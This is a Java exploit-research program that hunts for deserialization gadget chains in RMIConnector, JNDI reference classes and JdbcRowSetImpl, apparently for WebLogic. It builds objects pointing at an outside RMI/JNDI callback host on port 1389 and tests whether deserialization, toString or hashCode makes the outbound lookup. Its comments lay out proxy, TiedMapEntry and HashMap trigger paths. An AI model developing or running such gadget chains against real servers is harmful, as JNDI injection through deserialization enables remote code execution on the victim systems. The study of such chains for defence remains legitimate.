import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import javax.management.remote.*;
import javax.management.remote.rmi.*;

/**
 * Deep analysis of RMIConnector deserialization.
 *
 * Question: Does RMIConnector have a custom readObject that calls connect()?
 * Or can we trigger connect() through other means?
 *
 * Also: Check if there's a toString/hashCode/equals on RMIConnector
 * that triggers connect() (for HashMap/HashSet entry points)
 */
public class RMIConnectorDeep {
    public static void main(String[] args) throws Exception {
        System.out.println("=== RMIConnector Deep Analysis ===\n");

        Class<?> c = RMIConnector.class;

        // Check for custom readObject
        System.out.println("--- Serialization hooks ---");
        try {
            Method readObj = c.getDeclaredMethod("readObject", ObjectInputStream.class);
            System.out.println("readObject: EXISTS!");
            readObj.setAccessible(true);
            // Print the method -- is it custom or default?
        } catch (NoSuchMethodException e) {
            System.out.println("readObject: NOT found (uses default)");
        }

        try {
            Method writeObj = c.getDeclaredMethod("writeObject", ObjectOutputStream.class);
            System.out.println("writeObject: EXISTS!");
        } catch (NoSuchMethodException e) {
            System.out.println("writeObject: NOT found");
        }

        try {
            Method readResolve = c.getDeclaredMethod("readResolve");
            System.out.println("readResolve: EXISTS!");
        } catch (NoSuchMethodException e) {
            System.out.println("readResolve: NOT found");
        }

        // Check hashCode/toString/equals
        System.out.println("\n--- hashCode/toString/equals ---");
        try {
            Method hashCode = c.getDeclaredMethod("hashCode");
            System.out.println("hashCode: OVERRIDDEN in RMIConnector");
        } catch (NoSuchMethodException e) {
            System.out.println("hashCode: uses Object.hashCode()");
        }

        try {
            Method toString = c.getDeclaredMethod("toString");
            System.out.println("toString: OVERRIDDEN in RMIConnector");
        } catch (NoSuchMethodException e) {
            System.out.println("toString: uses Object.toString()");
        }

        try {
            Method equals = c.getDeclaredMethod("equals", Object.class);
            System.out.println("equals: OVERRIDDEN in RMIConnector");
        } catch (NoSuchMethodException e) {
            System.out.println("equals: uses Object.equals()");
        }

        // Now check: what happens on deserialization?
        System.out.println("\n--- Deserialization roundtrip ---");
        String callback = "service:jmx:rmi:///jndi/rmi://host.docker.internal:1389/DESER_TEST";
        JMXServiceURL url = new JMXServiceURL(callback);
        RMIConnector conn = new RMIConnector(url, null);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(conn);
        oos.close();
        byte[] data = bos.toByteArray();
        System.out.println("Serialized: " + data.length + " bytes");

        System.out.println("Deserializing...");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object deserialized = ois.readObject();
        System.out.println("Deserialized: " + deserialized.getClass().getName());

        // After deserialization, check state
        RMIConnector conn2 = (RMIConnector) deserialized;
        System.out.println("Address after deser: " + conn2.getAddress());

        // Does toString trigger connect?
        System.out.println("\ntoString after deser:");
        try {
            String s = conn2.toString();
            System.out.println("  " + s);
        } catch (Throwable e) {
            System.out.println("  Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // KEY TEST: Can we make RMIConnector auto-connect on deserialization?
        // What if we set 'connected' to true before serialization?
        // Then after deser, operations think it's connected but connection is null
        System.out.println("\n--- Attempt: Force connected state ---");
        Field connectedField = c.getDeclaredField("connected");
        connectedField.setAccessible(true);
        // connected is transient -- won't survive serialization
        System.out.println("'connected' is transient: " + Modifier.isTransient(connectedField.getModifiers()));

        // What about rmiServer field? It's final but NOT transient
        Field rmiServerField = c.getDeclaredField("rmiServer");
        rmiServerField.setAccessible(true);
        System.out.println("'rmiServer' transient: " + Modifier.isTransient(rmiServerField.getModifiers()));
        System.out.println("'rmiServer' final: " + Modifier.isFinal(rmiServerField.getModifiers()));
        System.out.println("'rmiServer' value: " + rmiServerField.get(conn));

        Field jmxUrlField = c.getDeclaredField("jmxServiceURL");
        jmxUrlField.setAccessible(true);
        System.out.println("'jmxServiceURL' transient: " + Modifier.isTransient(jmxUrlField.getModifiers()));
        System.out.println("'jmxServiceURL' value: " + jmxUrlField.get(conn));

        // ALTERNATIVE APPROACH: What if we find a class that WRAPS RMIConnector
        // and calls connect() during its own deserialization or method call?

        // Check if JMXConnectorFactory or similar
        System.out.println("\n\n=== Alternative: LazyConnectingJMXConnector? ===");
        String[] jmxClasses = {
            "javax.management.remote.JMXConnectorFactory",
            "javax.management.remote.rmi.RMIConnectorServer",
            "com.sun.jmx.remote.internal.ClientNotifForwarder",
            "weblogic.management.jmx.MBeanServerInvocationHandler",
            "weblogic.management.remote.common.ClientProviderBase",
        };
        for (String name : jmxClasses) {
            try {
                Class<?> cl = Class.forName(name);
                boolean ser = Serializable.class.isAssignableFrom(cl);
                System.out.println(cl.getSimpleName() + " -- Ser:" + ser);
            } catch (ClassNotFoundException e) {
                // skip
            } catch (NoClassDefFoundError e) {
                System.out.println(name + " -- NoClassDef: " + e.getMessage());
            }
        }

        // APPROACH 2: Instead of RMIConnector, use InitialContext directly
        // javax.naming.InitialContext is NOT Serializable (checked earlier)
        // But what about javax.naming.Reference?
        System.out.println("\n\n=== JNDI Reference approach ===");
        String[] jndiClasses = {
            "javax.naming.Reference",
            "javax.naming.StringRefAddr",
            "javax.naming.LinkRef",
            "com.sun.jndi.rmi.object.ReferenceWrapper",
        };
        for (String name : jndiClasses) {
            try {
                Class<?> cl = Class.forName(name);
                boolean ser = Serializable.class.isAssignableFrom(cl);
                System.out.println(cl.getSimpleName() + " -- Ser:" + ser);
            } catch (ClassNotFoundException e) {
                System.out.println(name + " -- NOT FOUND");
            }
        }

        // APPROACH 3: Can we make a Dynamic Proxy for Comparable
        // that delegates compareTo() to RMIConnector.connect()?
        // EventHandler(RMIConnector, "connect", null, null)
        // When Comparable.compareTo() is called -> EventHandler -> connect() -> JNDI
        // BUT EventHandler is NOT Serializable!
        //
        // What about using AnnotationInvocationHandler?
        // AIH.invoke(proxy, method, args):
        //   if method is "equals" -> equalsImpl(args[0])
        //   if method is "toString" -> toStringImpl()
        //   if method is "hashCode" -> hashCodeImpl()
        //   else -> memberValues.get(method.getName())
        //
        // For Comparable.compareTo(other):
        //   -> AIH.invoke(proxy, "compareTo", [other])
        //   -> memberValues.get("compareTo")
        //   -> returns whatever value we stored
        // This DOESN'T call connect()!

        // APPROACH 4: Check if there are WebLogic-specific Comparable/Comparator
        // classes whose compareTo/compare calls connect() on the argument
        System.out.println("\n\n=== WL-specific toString/hashCode that trigger connect ===");
        // Some objects call getXXX() in their toString() implementation
        // If toString() calls a getter that triggers JNDI...
        // Then HashMap(key.hashCode()) or TreeMap(compareTo) could trigger it
        // via TiedMapEntry.hashCode() -> getValue() -> toString()

        // JdbcRowSetImpl does NOT have dangerous toString/hashCode
        // But what about WebLogic's own rowset implementations?
        System.out.println("JdbcRowSetImpl.toString():");
        try {
            Class<?> jrs = Class.forName("com.sun.rowset.JdbcRowSetImpl");
            Object o = jrs.getDeclaredConstructor().newInstance();
            jrs.getMethod("setDataSourceName", String.class).invoke(o, callback);
            System.out.println("  Calling toString()...");
            try {
                String s = o.toString();
                System.out.println("  Result: " + (s.length() > 100 ? s.substring(0, 100) : s));
            } catch (Throwable e) {
                System.out.println("  Exception in toString: " + e.getClass().getSimpleName());
                checkJndi(e);
            }

            // Check hashCode
            System.out.println("  Calling hashCode()...");
            try {
                int h = o.hashCode();
                System.out.println("  hashCode: " + h);
            } catch (Throwable e) {
                System.out.println("  Exception in hashCode: " + e.getClass().getSimpleName());
                checkJndi(e);
            }
        } catch (Exception e) {
            System.out.println("  Error: " + e);
        }
    }

    static void checkJndi(Throwable e) {
        StringWriter sw = new StringWriter();
        e.printStackTrace(new PrintWriter(sw));
        String trace = sw.toString();
        boolean jndi = trace.contains("javax.naming") || trace.contains("JNDI")
            || trace.contains("lookup") || trace.contains("Connection refused")
            || trace.contains("connect(");
        if (jndi) {
            System.out.println("  *** JNDI EVIDENCE ***");
        }
    }
}
